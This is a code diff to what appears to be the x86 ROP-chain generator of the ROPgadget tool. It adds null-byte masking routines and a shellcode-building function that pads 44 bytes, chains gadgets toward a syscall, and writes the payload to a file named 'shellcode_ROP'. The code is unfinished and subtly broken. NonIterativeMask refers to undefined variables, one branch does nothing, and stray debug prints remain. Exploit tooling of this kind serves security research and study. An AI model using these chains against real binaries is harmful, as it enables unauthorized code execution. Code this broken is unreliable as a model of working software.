@@ -10,6 +10,7 @@
 import re
 from struct import pack
 from ropgadget.ropchain.NullHandler import NullHandler as nh
+from ropgadget.ropchain.MaskBuilder import MaskBuilder as mb
 from collections import defaultdict
 
 
@@ -108,7 +109,7 @@ class ROPMakerX86(object):
 
         return outputdict
 
-    def __lookingForMasks(self, regdst, regsrc, possiablemasks, possiablemovs, possiablepops,possiabledoubles):
+    def __lookingForMasks(self, regdst, regsrc, possiablemasks, possiablemovs, possiablepops, possiabledoubles):
 
         bestmaskchain= None
 
@@ -205,6 +206,31 @@ class ROPMakerX86(object):
             f = gadget["gadget"].split(" ; ")[0]
             # regex -> mov dword ptr [r32], r32
             regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
+            if regex:
+                lg = gadget["gadget"].split(" ; ")[1:]
+                try:
+                    for g in lg:
+                        if g.split()[0] != "pop" and g.split()[0] != "ret":
+                            raise
+                        # we need this to filterout 'ret' instructions with an offset like 'ret 0x6', because they ruin the stack pointer
+                        if g != "ret":
+                            if g.split()[0] == "ret" and g.split()[1] != "":
+                                raise
+
+                    print("\t[+] Gadget found: 0x%x %s" % (gadget["vaddr"], gadget["gadget"]))
+                    return [gadget,regex.group("dst"), regex.group("src")]
+                except:
+                    continue
+        return None
+    
+    def __lookingForDst4Write(self, gadgetsAlreadyTested, dst):
+
+        for gadget in self.__gadgets:
+            if gadget in gadgetsAlreadyTested:
+                continue
+            f = gadget["gadget"].split(" ; ")[0]
+            # regex -> mov dword ptr [r32], r32
+            regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([" + dst + "]{3}))$", f)
             if regex:
                 lg = gadget["gadget"].split(" ; ")[1:]
                 try:
@@ -476,7 +502,7 @@ class ROPMakerX86(object):
         outputfile.close()
 
 
-    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
+    def arbitrary_shell_code(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask):
 
         sects = self.__binary.getDataSections()
         dataAddr = None
@@ -489,26 +515,30 @@ class ROPMakerX86(object):
 
         #p = b'A' * self.padding
         p = b'\x41' * 44
-        #p += b'BBBB'
         
         stack = dataAddr
         print("STACK ADDRESS IS: {:08x}".format(stack))#stack.to_bytes(4, byteorder="big"))
 
-        ###############
 
         loc_of_shellcode = stack + (4*(11 + 2*125 + 1))
         #byte_loc_of_shellcode = loc_of_shellcode.to_bytes(4, byteorder="big")
 
-        #print(byte_loc_of_shellcode)
+        ###############
+
+        p += self.GenerateMaskRopChain(0xAABBCC00, stack, popEcx, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask, True)
+
+        #print("".join('\\x{:02x}'.format(i) for i in p))
+
+        ###############
 
         # puts start address in to ebx 
         
         p += pack('<I', popEbx["vaddr"]) 
-        p += pack('<4s', loc_of_shellcode)#self.CCMA(byte_loc_of_shellcode, {}, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall))       # start address of the 
+        p += pack('<I', loc_of_shellcode)#self.CCMA(byte_loc_of_shellcode, {}, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall))       # start address of the 
         p += self.__custompadding(popEbx, {})
 
         #puts stack in to ebx (program)
-        
+
         
         p += pack('<I', popEcx["vaddr"]) 
         p += pack('<I', 0xFFFFFFFF)#0x00000030)#48)#popEcx["vaddr"]) 
@@ -559,27 +589,117 @@ class ROPMakerX86(object):
 
         #print("ROP CHAIN:", p)
 
+        print(p)
+
         file = open("shellcode_ROP", "wb")
         file.write(p)
         file.close()
 
 
+     # Apply mask rop chain
+    
+    def GenerateMaskRopChain(self, value, stack, arbPop, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask, is_addr=False):
+        
+        #p = b'A'*44
 
-    # Creates the first part of the mask
-    def CM(self, addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
+        p = b''
+    
+        if (chainmask[2][1] == "dec" or chainmask[2][1] == "inc"):
+            # Use DEC as the (un)masker
+            print("We have INC/DEC!!!")
+
+            mask, masked_addr = nh(self.__WORD_SIZE).CreateIterativeMask(value.to_bytes(4, byteorder="big"), chainmask[2][1]) 
+            
+            print(mask, masked_addr)
+
+            print("PAIN:", chainmask[0][0])
+            # pop into some reg
+            p += pack("<I", popSrc["vaddr"])
+            p += pack("<I", masked_addr)
+            p += self.__custompadding(popSrc, {})
+
+            for i in range(mask):
+                p += pack("<I", chainmask[0][0]["vaddr"])
+                p += self.__custompadding(chainmask[0][0], {chainmask[1]:masked_addr})
+            
+        
+        # Case of non-iterative arithmetic masks
+        elif (chainmask[2][1] == "add" or chainmask[2][1] == "sub"):
+
+            print("We have add/sub")
+
+            mask, masked_addr = nh(self.__WORD_SIZE).CreateNonIterativeMask(value.to_bytes(4, byteorder="big"), chainmask[2][1])
+
+            p = self.NonIterativeMask(mask, mask_addr, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask,)
+            
+
+        # case of bitwise masks
+        elif (chainmask[2][1] == "xor"):
+            print("We have XOR!!!")
+
+        else:
+            print("NOTHING")
+
+        ##### post processing for #####
+
+
+        # If the value that has been passed through is an address then we need to push it onto the stack so it can the be run
+        if (is_addr):
+            p += pack("<I", chainmask[0][-1]["vaddr"])
+            p += self.__custompadding(chainmask[0][-1], {})
+
+        '''
+        # Or it's a value that's to be added onto the stack
+        else:
+            # Stack needs to look like this
+
+            ##### POP DST #####
+            ## *unMasked Val ## -----
+            ### WRITE4WHERE ###     |   *unmasked Val is the pointer the to the location in memroy where we the ROPchain writes the unmasked value
+            ###### ARB <> #####     |   ARB <>. This is some arbitrary gadget that pops the unMaskedValue off the stack
+            #\\ UnMasked Val /# <----
+
+            p += pack("<I", popDst["vaddr"])
+
+            stack = stack + len(p)          # Get location of where to write to on stack
+
+            PointerToValue = stack
+
+            # Start of p_alt
+            #p_alt  = pack("<I", 0xFFFFFFFF)     # place holder for later on
+            p_alt  = self.__custompadding(popDst, {})   # RISKY!!! Unfortunately we can't make sure the value is still in the correct register as there is a NULL byte in the value we want (there padding wouldn't work here)
+
+            p_alt += pack("<I", write4where["vaddr"])
+            p_alt += self.__custompadding(write4where, {})
+
+            p_alt += pack("<I", arbPop["vaddr"])
+            p_alt += pack("<I", 0xFFDDFFEE)     # placeholder for where to be written to later on
+            p_alt += self.__custompadding(arbPop, {})
+
+            MemoryLocationOfValue = stack + len(p_alt)
+
+            stack = stack + MemoryLocationOfValue + 4
+
+            print("Memory: {0:8x}".format(MemoryLocationOfValue))
+            p += pack("<I", MemoryLocationOfValue)
+            p += p_alt
+        '''
+
+
+        return p
+
+
+    # Used to create a ROPchain for non iteratie masks (i.e. inc and dec). These chains are the most efficient
+    # Based off the old function CM
+    def NonIterativeMask(self, mask, mask_addr, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask,):
         # Creates a stack of this shape
         
         ##### POP SRC #####
         ### Masked_addr ###
         ##### POP DST #####
         ####### Mask ######
-        ### XOR SRC/DST ###
-    
-        # Get mask and masked address
-        mask, masked_addr = nh().CreateMask(addr)
+        ### Apply MASK  ### <-- Result stays in SRC
 
-        int_masked_addr = int.from_bytes(masked_addr, byteorder="big")
-        print("The mask is {0:8x}, and the masked addr is {1:8x}.".format(mask, masked_addr))
 
         b =  pack("<I", popSrc["vaddr"])
         b += pack("<I", int_masked_addr)#" + str(self.__WORD_SIZE) + "s", masked_addr )
@@ -593,139 +713,7 @@ class ROPMakerX86(object):
         # Add padding for XOR
 
         return b
-
-    # (C)heck and (C)reate (M)asked (A)ddress. Checks and creates an addr for nulls - if it contains a null then it creates a mask and outputs the ropchain associated with decoding it
-    def CCMA(self, addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):#, xorSrcDst, pushSrc):
-        # If the addr contains no NULLs then we just return
-        if (not ( nh().contains_null(addr) ) ):
-            return addr
-        else:
-            
-            # We want to lay the stack out like so
-
-            ##### POP SRC ##### -----
-            ### Masked_addr ###     |
-            ##### POP DST #####     |-- Created with `self.CM()`
-            ####### Mask ######     |
-            ### XOR SRC/DST ### -----
-            ##### PUSH SRC #### 
-            '''
-            # Get mask and masked address
-            mask, masked_addr = NullHandler
-
-            print("POP GADGET: " + popSrc["gadget"])
-
-            b =  pack("<I", popSrc["vaddr"])
-            b += pack("<" + str(self.__WORD_SIZE) + "s", masked_addr )
-            b += self.__custompadding(popSrc, regAlreadSetted )        # merge any previous regs with the current one that's just been popped
-            
-            b += pack("<I", popDst["vaddr"])
-            b += pack("<" + str(self.__WORD_SIZE) + "s", mask )
-            b += self.__custompadding(popDst, regAlreadSetted | popSrc["gadget"].split()[1])
-            '''
-
-            b = self.CM(addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-            
-            # WE DON'T NEED TO SET redAlreadSetted to include SRC as the PUSH is only doing that
-            # b += pack("<I", pushSrc)PUSH SRC                  # PUSH SRC
-            # b += self__custompadding(PUSHSRC, regAlreadSetted)
-
-
-            return b
-
-    # Check and Create a Masked Values. Creates an ROP-Chain for Values to be pushed onto the stack and de-masked at runtime
-    def CCMV(self, addr, regAlreadySetted, arb, stackPointer, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall):
-
-        if (not (nh().contains_null(addr))):
-            return addr
-        else:
-
-            # We want to lay the stack out like so
-
-            ##### POP SRC ##### -----
-            ### Masked_addr ###     |
-            ##### POP DST #####     |-- Created with `self.CM()`
-            ####### Mask ######     |popSrc["gadget"].split()[1]
-            ### XOR SRC/DST ### -----
-            ##### POP DST #####
-            ## *unMasked Val ## -----
-            ### WRITE4WHERE ###     |   *unmasked Val is the pointer the to the location in memroy where we the ROPchain writes the unmasked value
-            ###### ARB <> #####     |   ARB <>. This is some arbitrary gadget that pops the unMaskedValue off the stack
-            #\\ UnMasked Val /# <----   This is written onto the stack so we can pop it into some register
-
-            # Adds the top half of the unveilder onto the stack
-            b = self.CM(addr, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-
-            # Rembemer to add padding protection for SRC (protection for the previous XOR)
-            b += pack("<I", popDst["vaddr"])
-            ####### WARNING #######
-            b += self.__custompadding(popDst, {})#{popSrc["gadget"].split()[1]: })  ## HIGH RISK - CURRENTLY NOT USING PADDING PROTECTION FOR SRC!!!!!!!!!!!!!
-            ####### WARNING ####### 
-
-            stackPointer = len(b)
-            loc_of_unmaskedPointer = stackPointer
-            unmaskedPointer = 0xFFFFFFFF       # Place holder so we can work out the exact address to point to
-
-            b += pack("<I", unmaskedPointer)
-
-            b += pack("<I", write4where["vaddr"])
-            b += self.__custompadding(write4where, {})
-
-            # Arbitrary gadget to execute with the unmasked addr on the stack
-
-            b += pack("<I", arb["vaddr"])
-            b += self.__custompadding(arb, {})
-
-            # adds some dummy packing to allow this rop to write into this little spot
-            b += pack("<I", 0x42424242)
-
-            stackPointer = len(b)
-
-            # Once we have the actual location of where we are going to write the unmasked value to the stack we need to go back and update the write4where location of this
-            b = b[0:loc_of_unmaskedPointer] + pack("<I", stackPointer - self.__WORD_SIZE) + b[loc_of_unmaskedPointer + self.__WORD_SIZE: stackPointer]
-
-            # We should have added an unveil in run time!!! (hopefully anyway)
-
-            # Things to check for next time:
-            #   - Padding is correct (for keeping certain registers the correct value)
-            #   - run this through gdb when we have the gadgets avaliable
-            
-            return b
-
-    # Encodes addresses that contains nulls                                                                                                     #       #          #        #        #
-    def Double_and_Add(self, value, regAlreadySetted, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, addSrc, addSrcDst, xorDst, incSrc):
-        # Here we build up a value from 0 using the double-and-add algorithm, will require at most l^2 gadgets where l is the length of the word in bits
-
-        ###############
-        ### XOR SRC ###     zeros src and dst
-        ### XOR DST ###
-        ### INC SRC ###     sets src to 1
-        ### ADD SRC ###     <-- start the double and add
-        ### ADD S/D ###
-        #     ...     #
-
-        p = pack('<I', xorSrc["vaddr"])
-        p += self.__custompadding(xorSrc, {})
-
-        p += pack('<I', xorDst["vaddr"])
-        p += self.__custompadding(xorDst, {})
-
-        p += pack('<I', incSrc["vaddr"])
-        p += self.__custompadding(incSrc, {})
-
-        bits_little_endian = "{0:b}".format(value)[::-1]
-
-        for i in range(bits_little_endian):
-            # double
-            b += pack('<I', addSrc["vaddr"])
-            b += self.__custompadding(addSrc, {})
-
-            # Do we need to add?
-            if (bool(int(bits_little_endian[i]))):
-                b += pack('<I', addSrcDst["vaddr"])
-                b += self.__custompadding(addSrcDst, {})
-        
-        # At this point we have the number in dst
+    
 
 
 
@@ -783,13 +771,43 @@ class ROPMakerX86(object):
                 continue
 
             #getting second source
-            chainmask = self.__lookingForMasks(write4where[1], write4where[2], possiablemasks, possiablemovs, possiablepops,possiabledoubles)
+            #chainmask = self.__lookingForMasks(write4where[1], write4where[2], possiablemasks, possiablemovs, possiablepops,possiabledoubles)
+            chainmask = self.__lookingForMasks(write4where[2], write4where[2], possiablemasks, possiablemovs, possiablepops,possiabledoubles)
             
             if(not chainmask):
                 print("\t[-] Can't find the 'mask chain' gadget. Try with another 'mov [r], r'\n")
                 gadgetsAlreadyTested += [write4where[0]]
                 continue
+            
+            # We need to add a push to chainmask
+            pushChainMask = self.__lookingForSomeThing("push %s" % chainmask[1])
+            if (not pushChainMask):
+                print("\t[-]Can't find the 'push' gadget associated with the chainmask. Try with another 'mov [r], r'")
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
 
+            # Add the 'push' gadget to the end of the chainmask
+            chainmask[0].append(pushChainMask)
+
+            '''
+            movSrcToEBX = self.__lookingForSomeThing("mov ebx, %s" % write4where[2])
+            if (not movSrcToEBX):
+                print("\t[-]Can't find the 'movSrcToEBX' gadget associated with the chainmask. Try with another 'mov [r], r'")
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+
+            movSrcToECX = self.__lookingForSomeThing("mov ebx, %s" % write4where[2])
+            if (not movSrcToECX):
+                print("\t[-]Can't find the 'movSrcToECX' gadget associated with the chainmask. Try with another 'mov [r], r'")
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+            
+            movSrcToEDX = self.__lookingForSomeThing("mov ebx, %s" % write4where[2])
+            if (not movSrcToEDX):
+                print("\t[-]Can't find the 'movSrcToEDX' gadget associated with the chainmask. Try with another 'mov [r], r'")
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+            '''
             if(len(storedgadget) != 0):
                 if(storedgadget[4][2][2] == 0):
 
@@ -828,8 +846,9 @@ class ROPMakerX86(object):
                 continue
  
         
-        print(chainmask)
+        print("NAH", chainmask)
         doubleandadd = chainmask[3]
+        print(doubleandadd)
         print("\n- Step 2 -- Init syscall number gadgets\n")
 
         xorEax = self.__lookingForSomeThing("xor eax, eax")
@@ -869,5 +888,8 @@ class ROPMakerX86(object):
 
         #self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
         #self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-        #self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        #self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask)
+
+
+        #print(self.GenerateMaskRopChain(0xFFFFFF00, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask, isaddr=True))
     
